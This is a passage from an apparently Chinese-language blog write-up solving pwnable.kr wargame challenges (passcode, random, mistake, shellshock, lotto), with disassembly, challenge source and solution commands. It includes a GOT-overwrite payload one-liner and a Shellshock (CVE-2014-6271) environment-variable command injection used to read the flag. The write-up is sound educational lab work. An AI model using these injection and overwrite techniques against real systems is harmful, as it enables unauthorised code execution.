</span></span><span class=line><span class=cl>.text:08048564 var_10          = dword ptr -10h
</span></span><span class=line><span class=cl>.text:08048564 var_C           = dword ptr -0Ch
</span></span><span class=line><span class=cl>.text:08048564
</span></span><span class=line><span class=cl>.text:08048564 ; __unwind {
</span></span><span class=line><span class=cl>.text:08048564                 push    ebp
</span></span><span class=line><span class=cl>.text:08048565                 mov     ebp, esp
</span></span><span class=line><span class=cl>.text:08048567                 sub     esp, 28h
</span></span><span class=line><span class=cl>.text:0804856A                 mov     eax, offset format ; &#34;enter passcode1 : &#34;
</span></span><span class=line><span class=cl>.text:0804856F                 mov     [esp], eax      ; format
</span></span><span class=line><span class=cl>.text:08048572                 call    _printf
</span></span><span class=line><span class=cl>.text:08048577                 mov     eax, offset aD  ; &#34;%d&#34;
</span></span><span class=line><span class=cl>.text:0804857C                 mov     edx, [ebp+var_10]
</span></span><span class=line><span class=cl>.text:0804857F                 mov     [esp+4], edx
</span></span><span class=line><span class=cl>.text:08048583                 mov     [esp], eax
</span></span><span class=line><span class=cl>.text:08048586                 call    ___isoc99_scanf
</span></span><span class=line><span class=cl>.text:0804858B                 mov     eax, ds:stdin@@GLIBC_2_0
</span></span><span class=line><span class=cl>.text:08048590                 mov     [esp], eax      ; stream
</span></span><span class=line><span class=cl>.text:08048593                 call    _fflush
</span></span><span class=line><span class=cl>.text:08048598                 mov     eax, offset aEnterPasscode2 ; &#34;enter passcode2 : &#34;
</span></span><span class=line><span class=cl>.text:0804859D                 mov     [esp], eax      ; format
</span></span><span class=line><span class=cl>.text:080485A0                 call    _printf
</span></span><span class=line><span class=cl>.text:080485A5                 mov     eax, offset aD  ; &#34;%d&#34;
</span></span><span class=line><span class=cl>.text:080485AA                 mov     edx, [ebp+var_C]
</span></span><span class=line><span class=cl>.text:080485AD                 mov     [esp+4], edx
</span></span><span class=line><span class=cl>.text:080485B1                 mov     [esp], eax
</span></span><span class=line><span class=cl>.text:080485B4                 call    ___isoc99_scanf
</span></span><span class=line><span class=cl>.text:080485B9                 mov     dword ptr [esp], offset s ; &#34;checking...&#34;
</span></span><span class=line><span class=cl>.text:080485C0                 call    _puts
</span></span><span class=line><span class=cl>.text:080485C5                 cmp     [ebp+var_10], 528E6h
</span></span><span class=line><span class=cl>.text:080485CC                 jnz     short loc_80485F1
</span></span><span class=line><span class=cl>.text:080485CE                 cmp     [ebp+var_C], 0CC07C9h
</span></span><span class=line><span class=cl>.text:080485D5                 jnz     short loc_80485F1
</span></span><span class=line><span class=cl>.text:080485D7                 mov     dword ptr [esp], offset aLoginOk ; &#34;Login OK!&#34;
</span></span><span class=line><span class=cl>.text:080485DE                 call    _puts
</span></span><span class=line><span class=cl>.text:080485E3                 mov     dword ptr [esp], offset command ; &#34;/bin/cat flag&#34;
</span></span><span class=line><span class=cl>.text:080485EA                 call    _system
</span></span><span class=line><span class=cl>.text:080485EF                 leave
</span></span><span class=line><span class=cl>.text:080485F0                 retn
</span></span></code></pre></div><p>0x080485e3=134514147</p><h3 id=实现>实现:<a hidden class=anchor aria-hidden=true href=#实现>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>python</span> <span class=o>-</span><span class=n>c</span> <span class=s1>&#39;print &#34;A&#34;*96+&#34;</span><span class=se>\x00\xa0\x04\x08</span><span class=s1>&#34;+&#34;134514147</span><span class=se>\n</span><span class=s1>&#34;&#39;</span> <span class=o>|</span> <span class=o>./</span><span class=n>passcode</span>
</span></span></code></pre></div><h2 id=6-random>6 random<a hidden class=anchor aria-hidden=true href=#6-random>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>random</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>random</span> <span class=o>=</span> <span class=nf>rand</span><span class=p>();</span>        <span class=c1>// random value!
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>key</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>key</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span> <span class=p>(</span><span class=n>key</span> <span class=o>^</span> <span class=n>random</span><span class=p>)</span> <span class=o>==</span> <span class=mh>0xdeadbeef</span> <span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Good!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/cat flag&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Wrong, maybe you should try 2^32 cases.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>注意到<code>rand()</code>没有用<code>srand()</code>设定种子, 那么种子默认为1, 生成的随机数应该是一个固定的序列.
我们在本地编译, 用gdb调试该程序, 得到random的值为1804289383.
而key^random的值应该是0xdeadbeef, 由于^的逆运算是它本身, deadbeef^random=key.
算出key = -1255736440, 运行random程序输入key得到flag</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>random@pwnable:~$ ./random
</span></span><span class=line><span class=cl>-1255736440
</span></span><span class=line><span class=cl>Good!
</span></span><span class=line><span class=cl>Mommy, I thought libc random is unpredictable...
</span></span></code></pre></div><h2 id=7-input>7 input<a hidden class=anchor aria-hidden=true href=#7-input>#</a></h2><h2 id=8-leg>8 leg<a hidden class=anchor aria-hidden=true href=#8-leg>#</a></h2><h2 id=9-mistake>9 mistake<a hidden class=anchor aria-hidden=true href=#9-mistake>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>We all make mistakes, let&#39;s move on.
</span></span><span class=line><span class=cl>(don&#39;t take this too seriously, no fancy hacking skill is required at all)
</span></span><span class=line><span class=cl>This task is based on real event
</span></span><span class=line><span class=cl>Thanks to dhmonkey
</span></span><span class=line><span class=cl>hint : operator priority
</span></span><span class=line><span class=cl>ssh mistake@pwnable.kr -p2222 (pw:guest)
</span></span></code></pre></div><p>提示是操作符的优先级</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#define PW_LEN 10
</span></span></span><span class=line><span class=cl><span class=cp>#define XORKEY 1 
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>void</span> <span class=nf>xor</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>s</span><span class=p>,</span> <span class=kt>int</span> <span class=n>len</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=n>len</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^=</span> <span class=n>XORKEY</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>fd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>fd</span><span class=o>=</span><span class=nf>open</span><span class=p>(</span><span class=s>&#34;/home/mistake/password&#34;</span><span class=p>,</span><span class=n>O_RDONLY</span><span class=p>,</span><span class=mo>0400</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;can&#39;t open password %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;do not bruteforce...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>sleep</span><span class=p>(</span><span class=nf>time</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>%</span><span class=mi>20</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>pw_buf</span><span class=p>[</span><span class=n>PW_LEN</span><span class=o>+</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>len</span><span class=o>=</span><span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span><span class=n>pw_buf</span><span class=p>,</span><span class=n>PW_LEN</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;read error</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>pw_buf2</span><span class=p>[</span><span class=n>PW_LEN</span><span class=o>+</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;input password : &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%10s&#34;</span><span class=p>,</span> <span class=n>pw_buf2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// xor your input
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nf>xor</span><span class=p>(</span><span class=n>pw_buf2</span><span class=p>,</span> <span class=mi>10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nf>strncmp</span><span class=p>(</span><span class=n>pw_buf</span><span class=p>,</span> <span class=n>pw_buf2</span><span class=p>,</span> <span class=n>PW_LEN</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Password OK</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/cat flag</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Wrong Password</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nf>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>观察这一行</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=n>fd</span><span class=o>=</span><span class=nf>open</span><span class=p>(</span><span class=s>&#34;/home/mistake/password&#34;</span><span class=p>,</span><span class=n>O_RDONLY</span><span class=p>,</span><span class=mo>0400</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>){</span>
</span></span></code></pre></div><p>乍一看没什么不对, 当返回的文件描述符小于0时报错
但是<code>&lt;</code>是比<code>=</code>优先级高的, 所以事实上首先open()会返回3(0, 1, 2是什么见第1题fd), 然后执行3&lt;0这个表达式, 它的值是0. 最后执行<code>fd=0</code>, 由第一题fd我们学到了fd = 0是stdin. 所以事实上password是我们输入的.
然后我们再来看xor这个函数, 它将一个字符串的前n个字符与1异或. 题目中给出的是前10个字符.
所以我们只需要先输入10个字符作为password, 再输入这些字符异或1得到的字符串. 由于字符'0&rsquo;的ascii码为110000, 字符'1&rsquo;的ascii码为110001, 恰好'0&rsquo;^1 = &lsquo;1&rsquo;. 所以只需进行如下操作</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>./mistake
</span></span><span class=line><span class=cl>do not bruteforce...
</span></span><span class=line><span class=cl>0000000000
</span></span><span class=line><span class=cl>1111111111input password : 
</span></span><span class=line><span class=cl>Password OK
</span></span><span class=line><span class=cl>Mommy, the operator priority always confuses me :(
</span></span></code></pre></div><h2 id=10-shellshock>10 shellshock<a hidden class=anchor aria-hidden=true href=#10-shellshock>#</a></h2><p>这是一个set-uid程序:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>int</span> <span class=nf>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nf>setresuid</span><span class=p>(</span><span class=nf>getegid</span><span class=p>(),</span> <span class=nf>getegid</span><span class=p>(),</span> <span class=nf>getegid</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=nf>setresgid</span><span class=p>(</span><span class=nf>getegid</span><span class=p>(),</span> <span class=nf>getegid</span><span class=p>(),</span> <span class=nf>getegid</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/home/shellshock/bash -c &#39;echo shock_me&#39;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>这是一个别名为shellshock的漏洞, CVE-2014-6271
原理大概是bash读取环境变量时会调用后面的函数, 在调用bash时会直接触发</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>export foo=&#39;{:;}; echo test&#39;
</span></span><span class=line><span class=cl>bash
</span></span><span class=line><span class=cl>test
</span></span></code></pre></div><p>测试方法:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>shellshock@pwnable:~$ env x=&#39;() { :;}; echo vulnerable&#39; bash -c &#34;echo this is a test&#34;
</span></span><span class=line><span class=cl>this is a test
</span></span><span class=line><span class=cl>shellshock@pwnable:~$ env x=&#39;() { :;}; echo vulnerable&#39; ./bash -c &#34;echo this is a test&#34;
</span></span><span class=line><span class=cl>vulnerable
</span></span></code></pre></div><p>证明环境变量中的bash没有此漏洞, 而当前目录的bash有此漏洞
攻击该程序: 如果real uid和effective uid相同时, 环境变量在程序内有效, 就可以利用这个漏洞. 而本题代码中</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>setresuid</span><span class=p>(</span><span class=nf>getegid</span><span class=p>(),</span> <span class=nf>getegid</span><span class=p>(),</span> <span class=nf>getegid</span><span class=p>());</span>
</span></span><span class=line><span class=cl><span class=nf>setresgid</span><span class=p>(</span><span class=nf>getegid</span><span class=p>(),</span> <span class=nf>getegid</span><span class=p>(),</span> <span class=nf>getegid</span><span class=p>());</span>
</span></span></code></pre></div><p>确保了这一点.
所以可以这样攻击:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>shellshock@ubuntu:~$ env x=&#39;() { :;}; /bin/cat flag&#39; ./shellshock
</span></span><span class=line><span class=cl>only if I knew CVE-2014-6271 ten years ago..!!
</span></span><span class=line><span class=cl>Segmentation fault
</span></span><span class=line><span class=cl>shellshock@ubuntu:~$
</span></span></code></pre></div><h2 id=11-coin1>11 coin1<a hidden class=anchor aria-hidden=true href=#11-coin1>#</a></h2><h2 id=12-blackjack>12 blackjack<a hidden class=anchor aria-hidden=true href=#12-blackjack>#</a></h2><h2 id=13-lotto>13 lotto<a hidden class=anchor aria-hidden=true href=#13-lotto>#</a></h2><p>lotto.c:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>submit</span><span class=p>[</span><span class=mi>6</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>play</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Submit your 6 lotto bytes : &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>r</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>submit</span><span class=p>,</span> <span class=mi>6</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Lotto Start!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>//sleep(1);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// generate lotto numbers
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/dev/urandom&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>fd</span><span class=o>==-</span><span class=mi>1</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;error. tell admin</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>lotto</span><span class=p>[</span><span class=mi>6</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>lotto</span><span class=p>,</span> <span class=mi>6</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>6</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;error2. tell admin</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=mi>6</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=n>lotto</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>lotto</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>%</span> <span class=mi>45</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>         <span class=c1>// 1 ~ 45
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nf>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// calculate lotto score
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>match</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=mi>6</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=k>for</span><span class=p>(</span><span class=n>j</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>j</span><span class=o>&lt;</span><span class=mi>6</span><span class=p>;</span> <span class=n>j</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                        <span class=k>if</span><span class=p>(</span><span class=n>lotto</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=n>submit</span><span class=p>[</span><span class=n>j</span><span class=p>]){</span>
</span></span><span class=line><span class=cl>                                <span class=n>match</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=c1>// win!
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>match</span> <span class=o>==</span> <span class=mi>6</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/cat flag&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;bad luck...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>help</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;- nLotto Rule -</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;nlotto is consisted with 6 random natural numbers less than 46</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;your goal is to match lotto numbers as many as you can</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;if you win lottery for *1st place*, you will get reward</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;for more details, follow the link below</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;mathematical chance to win this game is known to be 1/8145060.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>        <span class=c1>// menu
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>menu</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span><span class=p>(</span><span class=mi>1</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;- Select Menu -</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;1. Play Lotto</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;2. Help</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;3. Exit</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>menu</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>switch</span><span class=p>(</span><span class=n>menu</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                        <span class=k>case</span> <span class=mi>1</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                                <span class=nf>play</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=k>case</span> <span class=mi>2</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                                <span class=nf>help</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=k>case</span> <span class=mi>3</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;bye</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                                <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=k>default</span><span class=o>:</span>
</span></span><span class=line><span class=cl>                                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;invalid menu</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
